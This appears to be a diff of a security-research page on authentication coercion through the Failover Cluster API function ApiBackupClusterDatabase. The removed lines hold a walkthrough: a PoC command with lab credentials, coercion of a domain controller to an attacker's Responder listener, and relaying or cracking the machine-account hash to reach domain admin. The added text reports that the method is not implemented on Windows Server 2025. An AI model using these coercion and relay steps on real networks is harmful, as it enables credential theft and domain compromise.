@@ -4,45 +4,22 @@
 
 + **Protocol**: [[MS-CMRP]: Failover Cluster: Management API (ClusAPI) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cmrp/ba4117c0-530e-4e70-a085-4b4cf5bbf193)
 
-+ **Protocol UUID**: b97db8b2-4c63-11cf-bff6-08002be23f2f
++ **Interface**: ClusAPI, UUID `b97db8b2-4c63-11cf-bff6-08002be23f2f`. On the tested host the registered interface version is **3.0** (binding with version 2.0 fails `ept_s_not_registered`).
 
-+ **Protocol version**: 0.0
-
-+ **SMB Named pipe**: ``
++ **Transport**: `ncacn_ip_tcp` (dynamic port via the endpoint mapper). Only present when the **Cluster service (ClusSvc) is running** — i.e. a cluster has been formed. Installing the Failover Clustering *feature* alone does not register the endpoint.
 
 + **Function name**: [`ApiBackupClusterDatabase`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cmrp/99990857-f857-402e-8018-b7eaca1fc6c1)
 
 + **Function operation number**: `104`
 
-+ **Authenticated**: Yes
-
++ **Authenticated**: Yes (cluster administrative access)
 
 ## Description
 
-In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-CMRP`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cmrp/ba4117c0-530e-4e70-a085-4b4cf5bbf193) protocol (with uuid `b97db8b2-4c63-11cf-bff6-08002be23f2f` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-CMRP`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cmrp/ba4117c0-530e-4e70-a085-4b4cf5bbf193) protocol.
-
-The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-CMRP]: Failover Cluster: Management API (ClusAPI) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cmrp/ba4117c0-530e-4e70-a085-4b4cf5bbf193) and allows to call RPC functions of this protocol. We will then call the remote [`ApiBackupClusterDatabase`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cmrp/99990857-f857-402e-8018-b7eaca1fc6c1) function on the remote Windows Server (192.168.2.1) with the following parameters:
-
-```cpp
-ApiBackupClusterDatabase('192.168.2.51\x00')
-```
-
-We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):
-
-```bash
-./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
-```
-
-![](./imgs/poc.png)
-
-This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:
-
-![](./imgs/hash.png)
-
-After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!
-
-
-## Function technical detail
+`ApiBackupClusterDatabase` was investigated as a coercion candidate: `lpszPathName` is a backup
+directory path, and per the specification a UNC path would make the cluster service (machine
+account) authenticate outbound to it. The call takes no cluster context handle, so it can be
+invoked directly after binding.
 
 ```cpp
 error_status_t ApiBackupClusterDatabase(
@@ -51,8 +28,32 @@ error_status_t ApiBackupClusterDatabase(
  );
 ```
 
+## Testing status — NOT a coercion vector on Windows Server 2025 (method not implemented)
+
+Tested against **Windows Server 2025** (domain controller) with a formed single-node cluster
+(`CL01`), 2026-09-14.
+
+- With the cluster running, the ClusAPI interface is registered in the endpoint mapper
+  ("Microsoft Cluster Server API") and binds successfully at **interface version 3.0** over
+  `ncacn_ip_tcp` (NTLM + packet privacy).
+- Calling `ApiBackupClusterDatabase` (opnum 104) with `lpszPathName = \\<listener>\share\clusbak`
+  returned **`0x00000078` ERROR_CALL_NOT_IMPLEMENTED**, and the listener recorded **no** outbound
+  connection.
+
+The legacy RPC cluster-database backup exposed by this opnum is **not implemented** on current
+Windows (cluster database backup is performed through the VSS writer mechanism instead). Because the
+server never reaches any path handling, `lpszPathName` is never dereferenced and **no coercion
+occurs**. This is a server-implementation behavior and could differ on much older Windows Server
+releases where the method may have been implemented.
+
+### Prerequisite note
+
+Even reaching the call requires a **formed cluster** (ClusSvc running). On a host with only the
+Failover Clustering feature installed but no cluster created, the ClusAPI endpoint is not registered
+(`ept_s_not_registered`) and the interface is unreachable.
+
 ## References
 
-+ Documentation of protocol [MS-CMRP]: Failover Cluster: Management API (ClusAPI) Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cmrp/ba4117c0-530e-4e70-a085-4b4cf5bbf193
++ [MS-CMRP]: Failover Cluster: Management API (ClusAPI) Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cmrp/ba4117c0-530e-4e70-a085-4b4cf5bbf193
 
-+ Documentation of function `ApiBackupClusterDatabase`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cmrp/99990857-f857-402e-8018-b7eaca1fc6c1
++ `ApiBackupClusterDatabase` (opnum 104): https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cmrp/99990857-f857-402e-8018-b7eaca1fc6c1
